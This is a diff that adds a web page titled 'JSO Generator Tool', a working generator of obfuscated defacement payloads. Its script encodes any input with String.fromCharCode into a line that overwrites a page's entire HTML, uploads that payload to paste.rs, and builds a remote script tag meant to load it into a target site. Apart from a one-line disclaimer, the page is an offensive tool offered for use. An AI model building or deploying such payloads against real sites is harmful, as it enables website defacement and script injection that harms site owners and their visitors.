@@ -1,0 +1,222 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>JSO Generator Tool | System32</title>
+
+<meta name="description" content="JSO generator Tool using String.fromCharCode. Jso generator by system32 ">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<style>
+:root{
+  --bg:#050814;
+  --panel:#0c1228;
+  --border:#1c2345;
+  --green:#00ff7f;
+  --text:#cfd8ff;
+  --muted:#6c7cff;
+  --danger:#ff3b3b;
+}
+*{box-sizing:border-box;font-family:Consolas,monospace}
+body{
+  margin:0;
+  background:radial-gradient(circle at top,#0b1430,#02040a 70%);
+  color:var(--text);
+}
+header{
+  display:flex;
+  justify-content:space-between;
+  align-items:center;
+  padding:16px 28px;
+  border-bottom:1px solid var(--border);
+}
+header h1{
+  margin:0;
+  color:var(--green);
+  font-size:18px;
+}
+header button{
+  background:none;
+  border:1px solid var(--border);
+  color:var(--text);
+  padding:8px 14px;
+  border-radius:6px;
+  cursor:pointer;
+}
+header button:hover{
+  border-color:var(--green);
+  color:var(--green);
+}
+.container{
+  max-width:1100px;
+  margin:30px auto;
+  padding:0 20px;
+}
+.panel{
+  background:var(--panel);
+  border:1px solid var(--border);
+  border-radius:12px;
+  padding:24px;
+}
+h2{color:var(--green)}
+textarea,input{
+  width:100%;
+  background:#050814;
+  border:1px solid var(--border);
+  color:var(--text);
+  padding:12px;
+  border-radius:8px;
+  resize:none;
+}
+.actions{
+  display:flex;
+  gap:10px;
+  margin-top:14px;
+  flex-wrap:wrap;
+}
+.btn{
+  padding:10px 16px;
+  border-radius:8px;
+  border:none;
+  cursor:pointer;
+  font-weight:bold;
+}
+.green{background:var(--green);color:#000}
+.red{background:var(--danger);color:#fff}
+footer{
+  text-align:center;
+  color:var(--muted);
+  font-size:12px;
+  margin:30px 0;
+}
+.warning{
+  border:1px solid #a57c00;
+  background:rgba(255,190,60,.08);
+  padding:12px;
+  border-radius:8px;
+  margin-bottom:18px;
+  color:#ffcc66;
+  font-size:13px;
+}
+</style>
+</head>
+
+<body>
+
+<header>
+  <h1>🧬 JSO Generator Tool | System32</h1>
+  <button onclick="location.href='/'">← Back to Home</button>
+</header>
+
+<div class="container">
+<div class="panel">
+
+<div class="warning">
+⚠ Educational & authorized use only.
+</div>
+
+<h2>1. Input (HTML / JS / Any Text)</h2>
+<textarea id="inputData" rows="6" placeholder="<h1>Hello System32</h1>"></textarea>
+
+<div class="actions">
+  <button class="btn green" onclick="generateJSO()">Generate JSO</button>
+  <button class="btn red" onclick="clearAll()">Clear</button>
+</div>
+
+<h2>2. JSO Output</h2>
+<textarea id="outputJSO" rows="6" readonly></textarea>
+
+<div class="actions">
+  <button class="btn green" onclick="copyText('outputJSO')">Copy JSO</button>
+  <button class="btn green" onclick="uploadPasteRS()">Upload to paste.rs</button>
+</div>
+
+<h2>3. Script Loader</h2>
+<input id="pasteUrl" placeholder="Paste paste.rs URL here to generate script tag">
+<textarea id="scriptTag" rows="2" readonly></textarea>
+
+<div class="actions">
+  <button class="btn green" onclick="genScriptTag()">Generate Script Tag</button>
+  <button class="btn green" onclick="copyText('scriptTag')">Copy</button>
+</div>
+
+</div>
+</div>
+
+<footer>
+System32 © 2026 • Security & Osint Research Toolkit
+</footer>
+
+<script>
+function generateJSO(){
+  var input = document.getElementById("inputData").value;
+  if(!input.trim()){
+    alert("Enter some content first");
+    return;
+  }
+
+  var codes = [];
+  for(var i=0;i<input.length;i++){
+    codes.push(input.charCodeAt(i));
+  }
+
+  var result =
+"document.documentElement.innerHTML=String.fromCharCode(" +
+codes.join(",") +
+");";
+
+  document.getElementById("outputJSO").value = result;
+}
+
+function uploadPasteRS(){
+  var data = document.getElementById("outputJSO").value;
+  if(!data.trim()){
+    alert("Generate JSO first");
+    return;
+  }
+
+  var form = document.createElement("form");
+  form.method = "POST";
+  form.action = "https://paste.rs";
+  form.target = "_blank";
+
+  var input = document.createElement("input");
+  input.type = "hidden";
+  input.name = "content";
+  input.value = data;
+
+  form.appendChild(input);
+  document.body.appendChild(form);
+  form.submit();
+  document.body.removeChild(form);
+}
+
+function genScriptTag(){
+  var url = document.getElementById("pasteUrl").value.trim();
+  if(!url.startsWith("http")){
+    alert("Invalid URL");
+    return;
+  }
+
+  var tag = '<script src="' + url + '"><\/script>';
+
+  document.getElementById("scriptTag").value = tag;
+}
+
+function copyText(id){
+  var el = document.getElementById(id);
+  el.focus();
+  el.select();
+  document.execCommand("copy");
+}
+
+function clearAll(){
+  ["inputData","outputJSO","pasteUrl","scriptTag"]
+  .forEach(function(id){
+    document.getElementById(id).value="";
+  });
+}
+</script>
+
+</body>
+</html>
